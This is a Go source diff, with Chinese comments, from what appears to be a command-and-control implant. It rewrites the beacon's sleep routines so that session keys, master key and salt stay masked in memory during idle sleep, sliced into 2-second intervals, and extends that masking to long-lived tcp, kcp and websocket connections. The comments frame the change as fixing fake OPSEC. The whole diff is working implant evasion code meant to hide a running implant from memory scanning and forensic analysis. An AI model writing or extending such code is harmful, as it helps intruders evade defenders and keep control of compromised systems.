@@ -4,7 +4,6 @@ import (
 	"encoding/binary"
 	"implant/core/config"
 	"implant/core/encrypt"
-	"implant/core/sleepmask"
 	"math/rand"
 	"time"
 )
@@ -88,7 +87,8 @@ func IsHeartbeatAck(decrypted []byte) bool {
 	return len(decrypted) == 4 && binary.BigEndian.Uint32(decrypted) == 3
 }
 
-// SleepWithJitter 按 config.WaitTime + 抖动休眠（持久传输空闲路径）；WaitTime<=0 时随机休眠。
+// SleepWithJitter 按 config.WaitTime + 抖动休眠；WaitTime<=0 时随机休眠。
+// 不做密钥遮蔽——需要遮蔽的空闲路径请用 SleepMaskedWithJitter / SleepMask。
 func SleepWithJitter(r *rand.Rand) {
 	if config.WaitTime > 0 {
 		d := NextInterval()
@@ -98,17 +98,55 @@ func SleepWithJitter(r *rand.Rand) {
 	time.Sleep(time.Duration(r.Intn(5000)) * time.Millisecond)
 }
 
-// SleepMask 在睡眠期间加密会话密钥（B9 sleep mask）。d 为睡眠时长。
-// 仅在 beacon 空闲睡眠期（http/oss 轮询间隔）调用，期间无其它 goroutine 访问会话密钥。
-// 会话密钥不存在时仅睡眠。
-// 注意：sleepmask 会对传入的 key 做就地 XOR（加密->睡眠->还原）。
-// GetSessionKey 已返回拷贝（防污染全局会话密钥，曾导致命令结果加密错钥、服务端 GCM 认证失败），
-// 直接传入即可，无需再拷贝。
+// SleepMaskedWithJitter 抖动休眠 + 密钥遮蔽（持久传输空闲路径）。
+//
+// 原实现只有轮询型传输走 mask，tcp/kcp/websocket/forward 这类**长连接**走的是
+// 无遮蔽的 SleepWithJitter —— 而长连接的会话密钥在内存里驻留时间最长（数小时），
+// 恰恰是最该保护的一类。这里统一到 mask 路径。
+func SleepMaskedWithJitter(r *rand.Rand) {
+	if config.WaitTime > 0 {
+		SleepMask(NextInterval())
+		return
+	}
+	SleepMask(time.Duration(r.Intn(5000)) * time.Millisecond)
+}
+
+// SleepMask 睡眠期间遮蔽全部密钥材料（B9 sleep mask）。
+//
+// 原实现取 GetSessionKey()（返回的是拷贝）再对拷贝做 XOR —— 真正的会话密钥
+// 在管理器里原样躺着，遮蔽的是一个谁也看不到的局部变量：看着有 OPSEC，实际没有。
+// 现在就地遮蔽真身（会话密钥/上一把/主密钥/盐 + 清空 AEAD 缓存），醒后还原并擦除 pad。
+//
+// 遮蔽按**不超过 maskSliceDuration 的片**进行，片与片之间重新判定是否有人要用密钥：
+// 空闲时几乎全程遮蔽；一旦有会话开始收发，最多再多等一片就还原（而不是让对方的
+// 收发等满整个睡眠周期）。这让"全传输遮蔽"不至于把实时隧道卡住。
 func SleepMask(d time.Duration) {
-	key, err := encrypt.GlobalClientKeyManager.GetSessionKey()
-	if err != nil || len(key) == 0 {
+	ckm := encrypt.GlobalClientKeyManager
+	if ckm == nil || d <= 0 {
 		time.Sleep(d)
 		return
 	}
-	sleepmask.SleepWithMask(d, key)
+	deadline := time.Now().Add(d)
+	for {
+		remaining := time.Until(deadline)
+		if remaining <= 0 {
+			return
+		}
+		slice := remaining
+		if slice > maskSliceDuration {
+			slice = maskSliceDuration
+		}
+		restore, masked := ckm.MaskForSleep()
+		if !masked {
+			time.Sleep(slice)
+			continue
+		}
+		time.Sleep(slice)
+		restore()
+	}
 }
+
+// maskSliceDuration 单次遮蔽的最长时间（片长）。默认 2s：
+// 有会话在遮蔽期间开始收发时，最多等这么久就能拿到密钥。
+// 声明为变量便于测试缩短片长。
+var maskSliceDuration = 2 * time.Second
